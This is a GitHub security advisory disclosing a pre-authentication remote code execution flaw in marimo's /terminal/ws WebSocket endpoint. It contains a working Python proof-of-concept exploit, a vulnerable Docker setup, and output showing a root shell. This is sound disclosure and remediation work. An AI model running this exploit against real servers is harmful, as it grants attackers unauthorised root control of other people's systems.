# [C] Marimo: Pre-Auth Remote Code Execution via Terminal WebSocket Authentication Bypass

## Summary
Severity: Critical
Advisory: GHSA-2679-6mx9-h9xc
CVE: CVE-2026-39987
CWE: CWE-306
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-04-08
Source: https://github.com/advisories/GHSA-2679-6mx9-h9xc
Type: github-advisory

## Affected
- PyPI: `marimo` — affected >=0 <0.23.0

## Details
## Summary

Marimo (19.6k stars) has a Pre-Auth RCE vulnerability. The terminal WebSocket endpoint `/terminal/ws` lacks authentication validation, allowing an unauthenticated attacker to obtain a full PTY shell and execute arbitrary system commands.

Unlike other WebSocket endpoints (e.g., `/ws`) that correctly call `validate_auth()` for authentication, the `/terminal/ws` endpoint only checks the running mode and platform support before accepting connections, completely skipping authentication verification.

## Affected Versions

Marimo <= 0.20.4 

## Vulnerability Details

### Root Cause: Terminal WebSocket Missing Authentication

`marimo/_server/api/endpoints/terminal.py` lines 340-356:

```python
@router.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket) -> None:
    app_state = AppState(websocket)
    if app_state.mode != SessionMode.EDIT:
        await websocket.close(...)
        return
    if not supports_terminal():
        await websocket.close(...)
        return
    # No authentication check!
    await websocket.accept()  # Accepts connection directly
    # ...
    child_pid, fd = pty.fork()  # Creates PTY shell
```

Compare with the correctly implemented `/ws` endpoint (`ws_endpoint.py` lines 67-82):

```python
@router.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket) -> None:
    app_state = AppState(websocket)
    validator = WebSocketConnectionValidator(websocket, app_state)
    if not await validator.validate_auth():  # Correct auth check
        return
```

### Authentication Middleware Limitation

Marimo uses Starlette's `AuthenticationMiddleware`, which marks failed auth connections as `UnauthenticatedUser` but does NOT actively reject WebSocket connections. Actual auth enforcement relies on endpoint-level `@requires()` decorators or `validate_auth()` calls.

The `/terminal/ws` endpoint has neither a `@requires("edit")` decorator nor a `validate_auth()` call, so unauthenticated WebSocket connections are accepted even when the auth middleware is active.

### Attack Chain

1. WebSocket connect to `ws://TARGET:2718/terminal/ws` (no auth needed)
2. `websocket.accept()` accepts the connection directly
3. `pty.fork()` creates a PTY child process
4. Full interactive shell with arbitrary command execution
5. Commands run as root in default Docker deployments

A single WebSocket connection yields a complete interactive shell.

## Proof of Concept

```python
import websocket
import time

# Connect without any authentication
ws = websocket.WebSocket()
ws.connect('ws://TARGET:2718/terminal/ws')
time.sleep(2)

# Drain initial output
try:
    while True:
        ws.settimeout(1)
        ws.recv()
except:
    pass

# Execute arbitrary command
ws.settimeout(10)
ws.send('id\n')
time.sleep(2)
print(ws.recv())  # uid=0(root) gid=0(root) groups=0(root)
ws.close()
```

### Reproduction Environment

```dockerfile
FROM python:3.12-slim
RUN pip install --no-cache-dir marimo==0.20.4
RUN mkdir -p /app/notebooks
RUN echo 'import marimo as mo; app = mo.App()' > /app/notebooks/test.py
WORKDIR /app/notebooks
EXPOSE 2718
CMD ["marimo", "edit", "--host", "0.0.0.0", "--port", "2718", "."]
```

### Reproduction Result

With auth enabled (server generates random `access_token`), the exploit bypasses authentication entirely:

```
$ python3 exp.py http://127.0.0.1:2718 exec "id && whoami && hostname"
[+] No auth needed! Terminal WebSocket connected
[+] Output:
uid=0(root) gid=0(root) groups=0(root)
root
ddfc452129c3
```

## Suggested Remediation

1. Add authentication validation to `/terminal/ws` endpoint, consistent with `/ws` using `WebSocketConnectionValidator.validate_auth()`
2. Apply unified authentication decorators or middleware interception to all WebSocket endpoints
3. Terminal functionality should only be available when explicitly enabled, not on by default

## Impact

An unauthenticated attacker can obtain a full interactive root shell on the server via a single WebSocket connection. No user interaction or authentication token is required, even when authentication is enabled on the marimo instance.

## References
- https://github.com/marimo-team/marimo/security/advisories/GHSA-2679-6mx9-h9xc
- https://nvd.nist.gov/vuln/detail/CVE-2026-39987
- https://github.com/marimo-team/marimo/pull/9098
- https://github.com/marimo-team/marimo/commit/c24d4806398f30be6b12acd6c60d1d7c68cfd12a
- https://github.com/marimo-team/marimo
- https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2025-39987
- https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2026-39987
- https://www.sysdig.com/blog/marimo-oss-python-notebook-rce-from-disclosure-to-exploitation-in-under-10-hours
